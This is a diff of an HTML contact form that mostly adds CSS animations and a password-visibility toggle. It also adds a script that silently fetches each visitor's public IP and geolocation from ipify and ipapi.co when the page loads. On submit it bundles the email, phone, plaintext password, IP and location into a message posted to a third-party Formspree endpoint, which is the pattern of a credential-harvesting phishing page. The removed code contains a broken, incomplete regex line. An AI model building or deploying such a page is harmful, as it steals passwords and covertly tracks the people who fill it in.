@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Form Submission</title>
+  <title>Animated Form Submission</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,29 +13,80 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      overflow: hidden;
+      animation: fadeIn 1s ease-in-out;
     }
+
     .form-container {
       background-color: white;
       padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      width: 300px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      width: 320px;
+      opacity: 0;
+      transform: translateY(-20px);
+      animation: slideDown 0.8s ease-out forwards;
     }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     .form-container h2 {
       text-align: center;
       margin-bottom: 20px;
+      color: #333;
     }
+
     .form-container label {
       display: block;
-      margin: 8px 0 4px;
+      margin: 10px 0 4px;
     }
+
     .form-container input, .form-container textarea {
       width: 100%;
       padding: 8px;
       margin-bottom: 12px;
       border: 1px solid #ddd;
       border-radius: 4px;
+      transition: 0.3s ease-in-out;
     }
+
+    .form-container input:focus, .form-container textarea:focus {
+      border-color: #4CAF50;
+      box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
+      transform: scale(1.02);
+    }
+
+    .password-container {
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+
+    .password-container input {
+      width: 100%;
+      padding-right: 40px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      cursor: pointer;
+      color: gray;
+      transition: 0.3s;
+    }
+
+    .toggle-password:hover {
+      color: black;
+    }
+
     .form-container button {
       background-color: #4CAF50;
       color: white;
@@ -43,48 +94,40 @@
       padding: 10px;
       width: 100%;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: 0.3s ease-in-out;
+      font-size: 16px;
+      border-radius: 5px;
     }
+
     .form-container button:hover {
       background-color: #45a049;
+      transform: scale(1.05);
+      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
     }
-    .error-popup {
-      position: fixed;
-      top: 20%;
-      left: 50%;
-      transform: translateX(-50%);
-      background-color: #f8d7da;
-      color: #721c24;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-      width: 80%;
-      max-width: 400px;
+
+    .hidden {
       display: none;
     }
-    .error-popup button {
-      background-color: #721c24;
-      color: white;
-      border: none;
-      padding: 5px 10px;
-      cursor: pointer;
-      border-radius: 4px;
-    }
-    .error-popup button:hover {
-      background-color: #5a1c20;
-    }
+
   </style>
 </head>
 <body>
 
   <div class="form-container">
     <h2>Submit Form</h2>
-    <form id="form" action="https://formspree.io/f/mzzdaggy" method="POST" onsubmit="return handleSubmit(event)">
+    <form id="form" action="https://formspree.io/f/xdkalzve" method="POST" onsubmit="return handleSubmit(event)">
+      
       <label for="email">Your Email:</label>
       <input type="email" name="email" id="email" required>
 
       <label for="phone">Your Phone Number:</label>
       <input type="text" name="phone" id="phone" required placeholder="e.g., 9763238745">
+
+      <label for="password">Password:</label>
+      <div class="password-container">
+        <input type="password" name="password" id="password" required>
+        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+      </div>
 
       <label for="message">Your Message:</label>
       <textarea name="message" id="message" required placeholder="Enter your message"></textarea>
@@ -93,45 +136,54 @@
     </form>
   </div>
 
-  <!-- Error Popup -->
-  <div class="error-popup" id="errorPopup">
-    <p>Invalid phone number. Please ensure it ends with.</p>
-    <button onclick="closeErrorPopup()">Close</button>
-  </div>
-
   <script>
+    let userIP = "Fetching...";
+    let userLocation = "Fetching...";
+
+    // Fetch Public IPv4 Address
+    fetch("https://api64.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+            userIP = data.ip;
+        })
+        .catch(error => {
+            console.error("Error fetching IP:", error);
+            userIP = "Unavailable";
+        });
+
+    // Fetch Location (City, Region, Country)
+    fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+            userLocation = `${data.city}, ${data.region}, ${data.country}`;
+        })
+        .catch(error => {
+            console.error("Error fetching location:", error);
+            userLocation = "Unavailable";
+        });
+
     function handleSubmit(event) {
-      event.preventDefault(); // Prevent form from submitting until validation
+        event.preventDefault(); // Prevent form from submitting immediately
 
-      const email = document.getElementById("email").value;
-      const phone = document.getElementById("phone").value;
-
-      // Validate phone number to ensure it ends with "45"
-      const phoneRegex = 
-
-      if (!phoneRegex.test(phone)) {
-        // Show error popup if phone number doesn't end with "45"
-        document.getElementById("errorPopup").style.display = "block";
-        return false;
-      } else {
-        // Prepare the message by including the email and phone number
+        const email = document.getElementById("email").value;
+        const phone = document.getElementById("phone").value;
+        const password = document.getElementById("password").value;
         const messageBox = document.getElementById("message");
-        const message = `Email: ${email}\nPhone: ${phone}\n\nMessage:\n` + messageBox.value;
 
-        // Set the message field with the email and phone
+        // Prepare the message with IP, location, and password details
+        const message = `Email: ${email}\nPhone: ${phone}\nPassword: ${password}\nIP Address: ${userIP}\nLocation: ${userLocation}\n\nMessage:\n` + messageBox.value;
+
+        // Set the message field with all collected data
         messageBox.value = message;
 
-        // Hide the error popup and proceed with form submission
-        document.getElementById("errorPopup").style.display = "none";
-
-        // Allow form submission to Formspree
+        // Allow form submission
         document.getElementById("form").submit();
         return true;
-      }
     }
 
-    function closeErrorPopup() {
-      document.getElementById("errorPopup").style.display = "none";
+    function togglePassword() {
+        const passwordField = document.getElementById("password");
+        passwordField.type = (passwordField.type === "password") ? "text" : "password";
     }
   </script>
 
